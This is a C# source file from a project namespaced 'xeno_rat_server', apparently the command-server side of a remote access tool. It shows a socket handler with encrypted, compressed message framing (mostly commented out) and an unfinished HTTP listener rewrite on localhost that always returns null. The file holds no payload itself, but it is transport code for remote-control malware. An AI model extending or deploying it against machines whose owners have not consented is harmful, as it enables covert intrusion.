﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace xeno_rat_server
{
    class header 
    {
        public bool Compressed=false;
        public int OriginalFileSize;
        public int T_offset=1;
    }
    public partial class SocketHandler
    {
        public Socket sock;
        public HttpListener httpListener;
        public HttpListenerContext httpTempContext;
        public byte[] EncryptionKey;
        public int socktimeout = 0;
        private bool doProtocolUpgrade = false;
        public SocketHandler(Socket socket, byte[] _EncryptionKey) 
        {
            sock = socket;
            sock.NoDelay = true;
            EncryptionKey =_EncryptionKey;

            // TODO
            string url = "http://localhost:8080/api/data/";

            // 创建HttpListener实例
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(url);
            // 启动监听器
            listener.Start();
            httpListener = listener;
        }


        private async Task<byte[]> RecvAllAsync_ddos_unsafer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }


        private async Task<byte[]> RecvAllAsync_ddos_safer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }
                int availableBytes = sock.Available;

                if (availableBytes > 0)
                {
                    int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                    if (recv == 0)
                    {
                        data = null;
                        break;
                    }

                    total += recv;
                    dataLeft -= recv;
                }
                else
                {
                    if (socktimeout != 0)
                    {
                        TimeSpan elapsed = DateTime.Now - startTimestamp;
                        if (elapsed.TotalMilliseconds >= socktimeout)
                        {
                            // Timeout reached, handle accordingly
                            data = null;
                            break;
                        }
                    }

                    TimeSpan timeSinceLastSend = DateTime.Now - lastSendTime;

                    if (timeSinceLastSend.TotalMilliseconds >= 3000) // Check if 1 second has passed
                    {
                        await sock.SendAsync(new ArraySegment<byte>(new byte[] { 1, 0, 0, 0, 2 }), SocketFlags.None);
                        lastSendTime = DateTime.Now; // Update the last send time
                    }

                    // Wait a short period before checking again to avoid busy waiting.
                    await Task.Delay(10);
                }
            }

            return data;
        }






        public async Task<bool> SendAsync(byte[] data)
        {
            if (data == null)
            {
                throw new ArgumentNullException(nameof(data), "data can not be null!");
            }

            // 发送响应
            if (this.httpTempContext == null)
            {
                throw new ArgumentNullException(nameof(data), "SendAsync Failed, illegal state!");
            }

            try
            {
                HttpListenerContext context = this.httpTempContext;
                HttpListenerResponse response = context.Response;
                response.ContentLength64 = data.Length;
                Stream output = response.OutputStream;
                await output.WriteAsync(data, 0, data.Length);
                output.Close();
                // 关闭连接
                context.Response.Close();

                this.httpTempContext = null;

                return true;
            }
             catch
            {
                return false;
            }

            //try
            //{
            //    if (doProtocolUpgrade) 
            //    {
            //        byte[] compressedData = Compression.Compress(data);
            //        byte didCompress = 0;
            //        int orgLen = data.Length;

            //        if (compressedData != null && compressedData.Length < orgLen)
            //        {
            //            data = compressedData;
            //            didCompress = 1;
            //        }
            //        byte[] header = new byte[] { didCompress };
            //        if (didCompress == 1)
            //        {
            //            header = Concat(header, IntToBytes(orgLen));
            //        }
            //        data = Concat(header, data);
            //        data = Encryption.Encrypt(data, EncryptionKey);
            //        data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
            //        byte[] size = IntToBytes(data.Length);
            //        data = Concat(size, data);

            //        return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
            //    }
            //    else 
            //    {
            //        data = Encryption.Encrypt(data, EncryptionKey);
            //        byte[] compressedData = Compression.Compress(data);
            //        byte didCompress = 0;
            //        int orgLen = data.Length;

            //        if (compressedData.Length < orgLen)
            //        {
            //            data = compressedData;
            //            didCompress = 1;
            //        }

            //        byte[] header = new byte[] { didCompress };
            //        if (didCompress == 1)
            //        {
            //            header = Concat(header, IntToBytes(orgLen));
            //        }

            //        data = Concat(header, data);
            //        byte[] size = IntToBytes(data.Length);
            //        data = Concat(size, data);

            //        return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
            //    }

            //}
            //catch
            //{
            //    return false; // should probably disconnect
            //}
        }
        public async Task<byte[]> ReceiveAsync()
        {
            try
            {
                while (true)
                {
                    HttpListenerContext context = await httpListener.GetContextAsync();
                    HttpListenerRequest request = context.Request;
                    this.httpTempContext = context;
                    // 检查请求方法是否为POST
                    if (request.HttpMethod == "POST")
                    {
                        String contextType = context.Request.ContentType;
                        if (contextType == "application/json")
                        {
                            // 读取请求内容
                            using (Stream body = request.InputStream)
                            {

                                using (StreamReader reader = new StreamReader(body, context.Request.ContentEncoding))
                                {
                                    string requestBody = reader.ReadToEnd();
                                    dynamic json = JsonConvert.DeserializeObject(requestBody);
                                    string dateCmdType = json["data"].ToString();
                                    MessageBox.Show("Received POST request body: " + requestBody, "Server.SocketHandler");
                                    
                                    // 这里可以将 requestBody 反序列化为具体的对象进行处理
                                }
                                //using (MemoryStream ms = new MemoryStream())
                                //{
                                //    body.CopyTo(ms);
                                //    byte[] requestData = ms.ToArray();
                                //    return requestData;
                                //    // 处理请求数据
                                //    // 这里可以将 requestData 转换为具体的数据格式进行处理
                                //}
                            }
                        }

                    }
                    return null;

                    //byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
                    //if (length_data == null)
                    //{
                    //    return null;//disconnect
                    //}
                    //int length = BytesToInt(length_data);
                    //byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
                    //if (data == null)
                    //{
                    //    return null;//disconnect
                    //}

                    //header Header;

                    //if (data[0] == 3)//protocol upgrade
                    //{
                    //    if (!doProtocolUpgrade) 
                    //    {
                    //        doProtocolUpgrade = true;
                    //    }
                    //    data = BTruncate(data, 1);
                    //    data = Encryption.Decrypt(data, EncryptionKey);
                    //    if (data[0] == 2)
                    //    {
                    //        continue;
                    //    }
                    //    Header = ParseHeader(data);
                    //    if (Header == null)
                    //    {
                    //        return null;//disconnect
                    //    }
                    //    data = BTruncate(data, Header.T_offset);
                    //    if (Header.Compressed)
                    //    {
                    //        data = Compression.Decompress(data, Header.OriginalFileSize);
                    //    }
                    //    return data;
                    //}
                    //else if (data[0] == 2)
                    //{
                    //    continue;
                    //}

                    //Header = ParseHeader(data);
                    //if (Header == null)
                    //{
                    //    return null;//disconnect
                    //}
                    //data = BTruncate(data, Header.T_offset);
                    //if (Header.Compressed)
                    //{
                    //    data = Compression.Decompress(data, Header.OriginalFileSize);
                    //}
                    //data = Encryption.Decrypt(data, EncryptionKey);
                    //return data;

                }
            }
            catch
            {
                return null;//disconnect
            }
        }

        public byte[] Concat(byte[] b1, byte[] b2)
        {
            if (b1 == null) b1 = new byte[] { };
            List<byte[]> d = new List<byte[]>();
            d.Add(b1);
            d.Add(b2);
            return d.SelectMany(a => a).ToArray();
        }
        private header ParseHeader(byte[] data) 
        {
            header Header = new header();
            if (data[0] == 1)
            {
                Header.Compressed = true;
                Header.OriginalFileSize = BytesToInt(data, 1);
                Header.T_offset = 5;
            }
            else if (data[0] != 0) 
            {
                return null;
            }
            return Header;
        }
        public byte[] BTruncate(byte[] bytes, int offset) 
        {
            byte[] T_data = new byte[bytes.Length-offset];
            Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
            return T_data;
        }
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }

        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }

        public void SetRecvTimeout(int ms) 
        {
            socktimeout=ms;
            sock.ReceiveTimeout = ms;
        }
        public void ResetRecvTimeout()
        {
            socktimeout=0;
            sock.ReceiveTimeout = 0;
        }
    }
}
